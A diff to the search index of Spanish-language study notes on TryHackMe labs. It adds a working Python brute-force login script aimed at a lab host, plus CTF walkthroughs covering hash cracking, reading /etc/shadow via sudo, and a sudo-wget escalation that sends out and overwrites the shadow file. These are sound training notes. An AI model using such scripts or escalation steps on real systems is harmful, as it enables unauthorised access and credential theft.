@@ -5844,8 +5844,8 @@
     "path": "/apuntes/thm/1-career/2-penetration-tester/4-web-application-red-teaming/2-custom-tooling/1-custom-tooling-using-python/2-developing-a-brute-forcing-tool/",
     "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/4. Web Application Red Teaming/2. Custom Tooling/1. Custom Tooling Using Python/2. Developing a Brute-Forcing Tool.md",
     "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 4. Web Application Red Teaming > 2. Custom Tooling > 1. Custom Tooling Using Python",
-    "content": "",
-    "modified": "2026-03-10T01:01:35"
+    "content": "Ahora que hemos entendido la importancia de Python para la creación de herramientas personalizadas, exploraremos cómo podemos desarrollar una herramienta de fuerza bruta para bypassear la autentificación. Los ataques de fuerza bruta involucran intentar múltiples usuarios y contraseñas hasta encontrar credenciales correctas. Aunque pueden ser mitigados con rate limiting, sigue siendo un trabajo sencillo para los hackers.\n\n-----------------------------------\n<h2>Comandos Esenciales</h2>\nAntes de empezar a programar, veamos algunas funciones esenciales y técnicas usadas en la fuerza bruta:\n\n- **Librerías de Peticiones:** Una librería de Python que facilita mandar peticiones HTTP y recibir respuestas de las aplicaciones web. Tiene funciones implementadas para mandar headers custom como user-agent, HTTP method y más.\n- **Manejo de Respuestas:** Identificar logins exitosos basado en el código de estado HTTP, redirecciones o patrones de contenido, las cuales ayudan a identificar credenciales válidas.\n- **Librería de String:** Funciones implementadas del módulo String hacen más fácil generar secuencias de letras, realizar manipulación de texto y más.\n\n------------------------------------\n<h2>Práctica</h2>\nPara entender la esencia de las herramientas personalizadas usando Python, considera una aplicación web en `http://python.thm/labs/lab1`. Visita la aplicación y verás el siguiente panel:\n\n![[Pasted image 20260320133943.png]]\n\nComo pentester, tu tarea es bypassear el mecanismo de autentificación y ganar acceso al dashboard principal. Supón que descubres el username `admin` y la contraseña es numérica de 4 dígitos.\n\nEscribe un script simple en Python para automatizar este ataque. \n\n```python\nimport requests\nimport string\n\nurl = \"http://python.thm/labs/lab1/index.php\"\n\nusername = \"admin\"\n\npassword_list = [str(i).zfill(4) for i in range(10000)]\n\ndef brute_force():\n    for password in password_list:\n        data = {\"username\": username, \"password\": password}\n        response = requests.post(url, data=data)\n\n        if \"Invalid\" not in response.text:\n            print(f\"[+] Found valid credentials: {username}:{password}\")\n            break\n\nbrute_force()\n```\n\nY ahora modifícalo para que se ajuste a un usuario llamado Mark y que tiene una contraseña formada por tres números y una letra (A-Z) mayúscula.\n\n```python\nimport requests\nimport string\n\nurl = \"http://python.thm/labs/lab1/index.php\"\n\nusername = \"Mark\"\n\npassword_list = [str(i).zfill(3) + letter  for i in range(1000) for letter in string.ascii_uppercase]\n\ndef brute_force():\n    for password in password_list:\n        data = {\"username\": username, \"password\": password}\n        response = requests.post(url, data=data)\n\n        if \"Invalid\" not in response.text:\n            print(f\"[+] Found valid credentials: {username}:{password}\")\n            break\n\nbrute_force()\n```",
+    "modified": "2026-03-21T01:02:58"
   },
   {
     "title": "0. CAPTCHApocalypse",
@@ -9948,8 +9948,8 @@
     "path": "/apuntes/thm/maquinas/1-easy/1-easy/",
     "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/1. Easy.md",
     "breadcrumb": "THM > Maquinas > 1. Easy",
-    "content": "1. [[Ciberseguridad/THM/Maquinas/1. Easy/1. Vulnerability Capstone/0. Vulnerability Capstone]]\n2. [[Ciberseguridad/THM/Maquinas/1. Easy/2. Pickle Rick/0. Pickle Rick]]\n3. [[0. Lookup]]\n4. [[0. Res]]\n5. [[0. Brooklyn Nine Nine]]\n6. [[0. TakeOver]]\n7. [[0. Overpass]]\n8. [[0. Publisher]]\n9. [[0. MD2PDF]]\n10. [[0. Basic Pentesting]]\n11. [[0. RootMe]]\n12. [[0. OhSINT]]\n13. [[0. Simple CTF]]\n14. [[0. Bounty Hacker]]\n15. [[0. Agent Sudo]]\n16. [[0. LazyAdmin]]\n17. [[0. Cyborg]]\n18. [[0. Skynet]]\n19. [[0. Startup]]\n20. [[0. Tomghost]]\n21. [[0. GamingServer]]\n22. [[0. Ignite]]\n23.",
-    "modified": "2026-03-19T01:10:47"
+    "content": "1. [[Ciberseguridad/THM/Maquinas/1. Easy/1. Vulnerability Capstone/0. Vulnerability Capstone]]\n2. [[Ciberseguridad/THM/Maquinas/1. Easy/2. Pickle Rick/0. Pickle Rick]]\n3. [[0. Lookup]]\n4. [[0. Res]]\n5. [[0. Brooklyn Nine Nine]]\n6. [[0. TakeOver]]\n7. [[0. Overpass]]\n8. [[0. Publisher]]\n9. [[0. MD2PDF]]\n10. [[0. Basic Pentesting]]\n11. [[0. RootMe]]\n12. [[0. OhSINT]]\n13. [[0. Simple CTF]]\n14. [[0. Bounty Hacker]]\n15. [[0. Agent Sudo]]\n16. [[0. LazyAdmin]]\n17. [[0. Cyborg]]\n18. [[0. Skynet]]\n19. [[0. Startup]]\n20. [[0. Tomghost]]\n21. [[0. GamingServer]]\n22. [[0. Ignite]]\n23. [[0. Brute It]]\n24. [[0. Wgel CTF]]\n25. [[0. Anthem]]\n26.",
+    "modified": "2026-03-21T01:02:59"
   },
   {
     "title": "1. Introduction",
@@ -10268,8 +10268,8 @@
     "path": "/apuntes/thm/maquinas/1-easy/11-rootme/0-rootme/",
     "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/11. RootMe/0. RootMe.md",
     "breadcrumb": "THM > Maquinas > 1. Easy > 11. RootMe",
-    "content": "[[Ciberseguridad/THM/Maquinas/1. Easy/11. RootMe/1. Introduction]]\n[[2. Reconnaissance]]\n[[3. Getting a Shell]]\n[[4. Privilege Escalation]]",
-    "modified": "2026-03-08T01:07:13"
+    "content": "[[Ciberseguridad/THM/Maquinas/1. Easy/11. RootMe/1. Introduction]]\n[[Ciberseguridad/THM/Maquinas/1. Easy/11. RootMe/2. Reconnaissance]]\n[[Ciberseguridad/THM/Maquinas/1. Easy/11. RootMe/3. Getting a Shell]]\n[[Ciberseguridad/THM/Maquinas/1. Easy/11. RootMe/4. Privilege Escalation]]",
+    "modified": "2026-03-21T01:02:59"
   },
   {
     "title": "1. Introduction",
@@ -10496,6 +10496,46 @@
     "modified": "2025-12-21T00:57:17"
   },
   {
+    "title": "1. Introduction",
+    "path": "/apuntes/thm/maquinas/1-easy/23-brute-it/1-introduction/",
+    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/23. Brute It/1. Introduction.md",
+    "breadcrumb": "THM > Maquinas > 1. Easy > 23. Brute It",
+    "content": "![[Pasted image 20260320151416.png]]\n\nAprende a hacer fuerza bruta, crackear hashes y escalar privilegios.",
+    "modified": "2026-03-21T01:02:59"
+  },
+  {
+    "title": "4. Privilege Escalation",
+    "path": "/apuntes/thm/maquinas/1-easy/23-brute-it/4-privilege-escalation/",
+    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/23. Brute It/4. Privilege Escalation.md",
+    "breadcrumb": "THM > Maquinas > 1. Easy > 23. Brute It",
+    "content": "Nos piden escalar los privilegios.\n\n1. ¿Cuál es la contraseña de `root`?\n\nPara esto primero miramos el grupo en el que estamos y nos damos cuenta de que estamos en el grupo sudo. Vamos a ver qué comandos podemos utilizar con `sudo -l`.\n\n![[Pasted image 20260320163045.png]]\n\nVamos a mirar en GTFOBins a ver si se puede hacer algo con esto.\n\n![[Pasted image 20260320163150.png]]\n\nPodemos leer archivos como sudo. Sabemos que las contraseñas (o más bien los hashes) se almacenan en el archivo `/etc/shadow`, por lo que vamos a buscar allí.\n\n![[Pasted image 20260320163252.png]]\n\nHemos encontrado el hash de la contraseña sudo. Vamos a crackearlo.\n\n![[Pasted image 20260320163646.png]]\n\nY así de fácil obtenemos la contraseña.\n\n2. ¿Cuál es `root.txt`?\n\nNos metemos con la contraseña obtenida y leemos el archivo correspondiente.\n\n![[Pasted image 20260320163814.png]]",
+    "modified": "2026-03-21T01:02:59"
+  },
+  {
+    "title": "0. Brute It",
+    "path": "/apuntes/thm/maquinas/1-easy/23-brute-it/0-brute-it/",
+    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/23. Brute It/0. Brute It.md",
+    "breadcrumb": "THM > Maquinas > 1. Easy > 23. Brute It",
+    "content": "[[Ciberseguridad/THM/Maquinas/1. Easy/23. Brute It/1. Introduction]]\n[[Ciberseguridad/THM/Maquinas/1. Easy/23. Brute It/2. Reconnaissance]]\n[[Ciberseguridad/THM/Maquinas/1. Easy/23. Brute It/3. Getting a Shell]]\n[[Ciberseguridad/THM/Maquinas/1. Easy/23. Brute It/4. Privilege Escalation]]",
+    "modified": "2026-03-21T01:02:59"
+  },
+  {
+    "title": "3. Getting a Shell",
+    "path": "/apuntes/thm/maquinas/1-easy/23-brute-it/3-getting-a-shell/",
+    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/23. Brute It/3. Getting a Shell.md",
+    "breadcrumb": "THM > Maquinas > 1. Easy > 23. Brute It",
+    "content": "Nos piden encontrar la forma de obtener una shell.\n\n1. ¿Cuál es el user:password del panel de administración?\n\nComo la máquina es de fuerza bruta sabemos que tendremos que hacerla, sin embargo, no tenemos ningún username todavía. Vamos a ver el código fuente de la página:\n\n![[Pasted image 20260320152552.png]]\n\nParece que un usuario se llama John, pero lo importante es que dicen que el username es `admin`. Vamos a hacer un ataque de fuerza bruta. Para ello, primero abrimos BurpSuite y vamos a ver cómo se ve una petición de login.\n\n![[Pasted image 20260320152804.png]]\n\nY ahora la respuesta de un mal login.\n\n![[Pasted image 20260320152832.png]]\n\nEsto es lo que usaremos como filtro invertido.\n\n![[Pasted image 20260320153251.png]]\n\nAhora que tenemos el usuario y la contraseña vamos a iniciar sesión.\n\n![[Pasted image 20260320153350.png]]\n\nCon esto hemos obtenido la flag web y la clave privada RSA.\n\n2. ¿Cuál es la passphrase de la clave privada RSA?\n\nUna vez tenemos la clave privada, podemos intentar usarla, pero no va a funcionar, porque necesitamos una passphrase:\n\n![[Pasted image 20260320155723.png]]\n\nAsí que vamos a usar el módulo `ssh2john` para convertir el hash de la passphrase de la clave RSA en un formato que la herramienta `john` pueda entender.\n\n![[Pasted image 20260320154001.png]]\n\nAsí encontramos la passphrase de la clave RSA.\n\n3. ¿Cuál es la flag `user.txt`?\n\nVamos a iniciar sesión por SSH y a mirar.\n\n![[Pasted image 20260320155802.png]]\n\n4. ¿Cuál es la flag web?\n\nLa encontramos en la web antes.",
+    "modified": "2026-03-21T01:02:59"
+  },
+  {
+    "title": "2. Reconnaissance",
+    "path": "/apuntes/thm/maquinas/1-easy/23-brute-it/2-reconnaissance/",
+    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/23. Brute It/2. Reconnaissance.md",
+    "breadcrumb": "THM > Maquinas > 1. Easy > 23. Brute It",
+    "content": "Vamos a ir respondiendo a las preguntas que se nos hacen:\n\n1. ¿Cuántos puertos hay abiertos?\n\nPara ver esto hacemos un escaneo de puertos común con `nmap`.\n\n![[Pasted image 20260320151748.png]]\n\nVemos que hay `2`.\n\n2. ¿Qué versión de SSH corre?\n\nPara esto podemos utilizar `-sV` pero yo voy a optar por `-A`, que es una opción más completa.\n\n![[Pasted image 20260320151849.png]]\n\nPodemos ver que la versión de SSH es `OpenSSH 7.6p1`.\n\n3. ¿Qué versión de Apache corre?\n\nEn la foto de arriba también vemos que la versión de Apache es `Apache httpd 2.4.29`.\n\n4. ¿Que distribución de Linux corre?\n\nLa distribución que corre de Linux es `Ubuntu`.\n\n5. ¿Cuál es el nombre del directorio oculto?\n\nPara encontrar esto vamos a realizar enumeración de directorios.\n\n![[Pasted image 20260320152205.png]]\n\nPodemos ver que el directorio es `/admin/`.",
+    "modified": "2026-03-21T01:02:59"
+  },
+  {
     "title": "0. Res",
     "path": "/apuntes/thm/maquinas/1-easy/4-res/0-res/",
     "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/4. Res/0. Res.md",
@@ -10710,6 +10750,70 @@
     "breadcrumb": "THM > Maquinas > 1. Easy > 14. Bounty Hacker",
     "content": "[[Ciberseguridad/THM/Maquinas/1. Easy/14. Bounty Hacker/1. Introduction]]\n[[Ciberseguridad/THM/Maquinas/1. Easy/14. Bounty Hacker/2. Finding the Flags]]",
     "modified": "2026-03-13T01:05:53"
+  },
+  {
+    "title": "1. Introduction",
+    "path": "/apuntes/thm/maquinas/1-easy/24-wgel-ctf/1-introduction/",
+    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/24. Wgel CTF/1. Introduction.md",
+    "breadcrumb": "THM > Maquinas > 1. Easy > 24. Wgel CTF",
+    "content": "![[Pasted image 20260320171419.png]]\n\n¿Puedes exfiltrar la flag de root?",
+    "modified": "2026-03-21T01:02:59"
+  },
+  {
+    "title": "2. Getting the Flags",
+    "path": "/apuntes/thm/maquinas/1-easy/24-wgel-ctf/2-getting-the-flags/",
+    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/24. Wgel CTF/2. Getting the Flags.md",
+    "breadcrumb": "THM > Maquinas > 1. Easy > 24. Wgel CTF",
+    "content": "<h2>Reconocimiento Inicial</h2>\nComenzamos haciendo un escaneo básico de puertos.\n\n![[Pasted image 20260320171845.png]]\n\nAhora vamos a escanear estos puertos más a fondo.\n\n![[Pasted image 20260320171950.png]]\n\nNada extremadamente interesante, aparentemente. Vamos a listar directorios web.\n\n![[Pasted image 20260320172502.png]]\n![[Pasted image 20260320172521.png]]\n![[Pasted image 20260320172545.png]]\n\nVamos a mirar cómo es la web.\n\n![[Pasted image 20260320173153.png]]\n\n-----------------------------------\n<h2>Profundización</h2>\nHay un directorio que llama mucho la atención: `/sitemap/.ssh/id_rsa`. Vamos a ver qué contiene.\n\n![[Pasted image 20260320173259.png]]\n\nUna clave privada, ahora sólo nos queda conocer el nombre de usuario que puede usarla. Investigando, volví al directorio `/`, que sale una página de configuración. Pero si vamos al código fuente de dicha página vemos esto:\n\n![[Pasted image 20260320174305.png]]\n\nParece que tenemos un nombre, `jessie`. \n\n-------------------------------------\n<h2>Explotación</h2>\nVamos a probar. Ponemos la clave en un archivo y le damos los permisos correspondientes.\n\n![[Pasted image 20260320174503.png]]\n\nBuscamos la flag.\n\n![[Pasted image 20260320174851.png]]\n\n-------------------------------------\n<h2>Escalada de Privilegios</h2>\nAhora tenemos que encontrar la fórmula para escalar los privilegios hasta root.\n\n![[Pasted image 20260320174953.png]]\n\nVemos unos cuantos grupos, esto puede ser interesante, volveré aquí si ninguna otra técnica funciona.\n\n![[Pasted image 20260320175038.png]]\n\nParece que hemos encontrado un comando utilizable con sudo sin contraseña: `wget`. Vamos a mirar en GTFOBins.\n\n![[Pasted image 20260320175147.png]]\n\nPero no funciona.\n\n![[Pasted image 20260320180048.png]]\n\nParece que en esta versión esa opción no está disponible. Vamos a buscar en GitHub. Buscando encontramos este [repo](https://github.com/ifeelkiddo/Sudo-Wget-Privilege-Escalation). Vamos a hacer lo que dice.\n\n1. Obtenemos el contenido de `/etc/shadow`.\n\nPara esto nos ponemos en escucha en la máquina atacante:\n\n![[Pasted image 20260320180435.png]]\n\nEn la máquina víctima pasamos el contenido del archivo a la máquina del atacante:\n\n![[Pasted image 20260320180958.png]]\n\nAsí obtenemos el contenido de `/etc/shadow`.\n\n![[Pasted image 20260320181048.png]]\n\n2. Creamos un nuevo archivo `/etc/shadow`.\n\nPegamos el contenido que hemos obtenido.\n\n![[Pasted image 20260320181234.png]]\n\n3. Creamos una nueva contraseña para el usuario `root` y lo añadimos al archivo.\n\nUtilizamos el comando `openssl`.\n\n![[Pasted image 20260320181316.png]]\n\nCopiamos el hash generado después de `root:` en el `shadow.txt` que hemos hecho.\n\n>[!CAUTION] Deja lo que hay después de los segundos dos puntos, déjalo así: `root:NUEVO_HASH:18195:0:99999:7:::`.\n\n4. Transferimos el contenido al otro archivo shadow.\n\nAbrimos un servidor de python.\n\n![[Pasted image 20260320181450.png]]\n\nDesde la máquina víctima usamos `wget` con sudo para sustituir el archivo.\n\n![[Pasted image 20260320181550.png]]\n\n5. Cambiamos a `root`.\n\n![[Pasted image 20260320181826.png]]\n\nUna vez conseguido cambiar de cuenta, sólo buscamos la flag de root y ya está.\n\n![[Pasted image 20260320181917.png]]\n\n-------------------------------\n<h2>Conclusión</h2>\nUna máquina bastante facilita. Hemos aprendido a no rendirnos después de que una técnica no funcione. Si un método no termina de funcionar pero hay indicios de que es por ese camino siempre hay que seguir intentándolo. \n\n>[!SUCCESS] Hemos conseguido obtener las dos flags.",
+    "modified": "2026-03-21T01:02:59"
+  },
+  {
+    "title": "0. Wgel CTF",
+    "path": "/apuntes/thm/maquinas/1-easy/24-wgel-ctf/0-wgel-ctf/",
+    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/24. Wgel CTF/0. Wgel CTF.md",
+    "breadcrumb": "THM > Maquinas > 1. Easy > 24. Wgel CTF",
+    "content": "[[Ciberseguridad/THM/Maquinas/1. Easy/24. Wgel CTF/1. Introduction]]\n[[Ciberseguridad/THM/Maquinas/1. Easy/24. Wgel CTF/2. Getting the Flags]]",
+    "modified": "2026-03-21T01:02:59"
+  },
+  {
+    "title": "1. Introduction",
+    "path": "/apuntes/thm/maquinas/1-easy/25-anthem/1-introduction/",
+    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/25. Anthem/1. Introduction.md",
+    "breadcrumb": "THM > Maquinas > 1. Easy > 25. Anthem",
+    "content": "![[Pasted image 20260320183641.png|315]]\n\nExplota una máquina Windows en un reto para principiantes.",
+    "modified": "2026-03-21T01:02:59"
+  },
+  {
+    "title": "2. Website Analysis",
+    "path": "/apuntes/thm/maquinas/1-easy/25-anthem/2-website-analysis/",
+    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/25. Anthem/2. Website Analysis.md",
+    "breadcrumb": "THM > Maquinas > 1. Easy > 25. Anthem",
+    "content": "Debemos de responder algunas preguntas.\n\n1. ¿En qué puerto está el servidor web?\n\nPara esto vamos a escanear con nmap como hacemos normalmente.\n\n![[Pasted image 20260320184419.png]]\n\nEl servidor web está en el puerto 80.\n\n2. ¿Qué puerto es para el servicio de escritorio remoto?\n\nBuscamos a ver qué es `ms-wbt-server`.\n\n![[Pasted image 20260320184459.png]]\n\nPues parece que sí el lo que pensábamos, puerto `3389`.\n\n3. ¿Cuál es la posible contraseña en uno de los archivos de la web?\n\nVamos a listar directorios web.\n\n![[Pasted image 20260320191447.png]]\n\nVamos a ver qué hay en estos directorios.\n\n![[Pasted image 20260320191556.png]]\n\nVamos a seguir mirando directorios.\n\n![[Pasted image 20260320191822.png]]\n\nParece que la contraseña estaba en `/robots.txt`.\n\n4. ¿Qué CMS está usando la web?\n\nSi nos fijamos en el `robots.txt` podemos ver que el CMS que utiliza es `Umbraco`.\n\n5. ¿Cuál es el dominio del sitio web?\n\nLo vemos en la propia página, es `anthem.com`.\n\n![[Pasted image 20260320192432.png]]\n\n6. ¿Cuál es el nombre del administrador?\n\nEn la página de `/a-cheers-to-our-it-department/` hay un poema. \n\n![[Pasted image 20260320192812.png]]\n\nSi lo buscamos en google:\n\n![[Pasted image 20260320192752.png]]\n\n7. ¿Puedes encontrar el email del administrador?\n\nViendo que el email de Jane Doe es `JD@anthem.com` el de nuestro administrador debe ser `SG@anthem.com`.\n\n![[Pasted image 20260320193100.png]]",
+    "modified": "2026-03-21T01:02:59"
+  },
+  {
+    "title": "4. Final Stage",
+    "path": "/apuntes/thm/maquinas/1-easy/25-anthem/4-final-stage/",
+    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/25. Anthem/4. Final Stage.md",
+    "breadcrumb": "THM > Maquinas > 1. Easy > 25. Anthem",
+    "content": "Vamos a meternos usando todo lo que encontramos.\n\n1. Asegura acceso inicial a la máquina, ¿cuál es el contenido de user.txt?\n\nUsando el usuario del email `sg` y la contraseña que encontramos, vamos a entrar por `rdesktop`.\n\n![[Pasted image 20260320194348.png|518]]\n\nEn el escritorio vemos lo siguiente:\n\n![[Pasted image 20260320194500.png]]\n\nSi hacemos click:\n\n![[Pasted image 20260320194533.png|561]]\n\n2. ¿Puedes encontrar la contraseña del admin?\n\nLe damos a la carpeta, luego a `View` y ahí a `hidden items`.\n\n![[Pasted image 20260320194809.png]]\n\nVemos que hay una carpeta llamada `backup` que estaba oculta.\n\n![[Pasted image 20260320194935.png]]\n\nDentro hay un documento llamado `restore`.\n\n![[Pasted image 20260320194905.png]]\n\nSi intentamos abrirlo vemos que no podemos.\n\n![[Pasted image 20260320195332.png]]\n\nLe damos:\n\n1. Click derecho -> Propiedades\n2. Edit\n3. Añadimos al usuario SG\n4. Le damos todos  los permisos\n5. Aplicamos\n\n![[Pasted image 20260320195433.png]]\n\nYa podemos verla.\n\n6. Escala tus privilegios, ¿cuál es el contenido de root.txt?\n\nVamos a la carpeta `Users` y le damos a `Administrator`.\n\n![[Pasted image 20260320195557.png]]\n\nNos saldrá esto:\n\n![[Pasted image 20260320195614.png]]\n\nLe damos a `Continue` y metemos la contraseña.\n\nSi ahora navegamos hasta el escritorio del administrador encontramos la flag.\n\n![[Pasted image 20260320200046.png]]\n\nY la leemos sin problemas.\n\n![[Pasted image 20260320200108.png]]",
+    "modified": "2026-03-21T01:02:59"
+  },
+  {
+    "title": "0. Anthem",
+    "path": "/apuntes/thm/maquinas/1-easy/25-anthem/0-anthem/",
+    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/25. Anthem/0. Anthem.md",
+    "breadcrumb": "THM > Maquinas > 1. Easy > 25. Anthem",
+    "content": "[[Ciberseguridad/THM/Maquinas/1. Easy/25. Anthem/1. Introduction]]\n[[2. Website Analysis]]\n[[3. Spot the Flags]]\n[[4. Final Stage]]",
+    "modified": "2026-03-21T01:02:59"
+  },
+  {
+    "title": "3. Spot the Flags",
+    "path": "/apuntes/thm/maquinas/1-easy/25-anthem/3-spot-the-flags/",
+    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/25. Anthem/3. Spot the Flags.md",
+    "breadcrumb": "THM > Maquinas > 1. Easy > 25. Anthem",
+    "content": "Nuestro querido admin dejó algunas flags atrás que tenemos que recoger antes de proceder a la siguiente tarea.\n\n1. ¿Cuál es la flag 1?\n\nEn la página `/archive/we-are-hiring` al principio.\n\n![[Pasted image 20260320193445.png]]\n\n2. ¿Cuál es la flag 2?\n\nAparece en la parte del medio de la página.\n\n![[Pasted image 20260320191638.png]]\n\n3. ¿Cuál es la flag 3?\n\nEn el directorio `/authors`.\n\n![[Pasted image 20260320191720.png]]\n\n4. ¿Cuál es la flag 4?\n\nAparece en la parte de arriba del código fuente de la página `/archive/a-cheers-to-our-it-department/`.\n\n![[Pasted image 20260320192047.png]]",
+    "modified": "2026-03-21T01:02:59"
   },
   {
     "title": "1. Introduction",
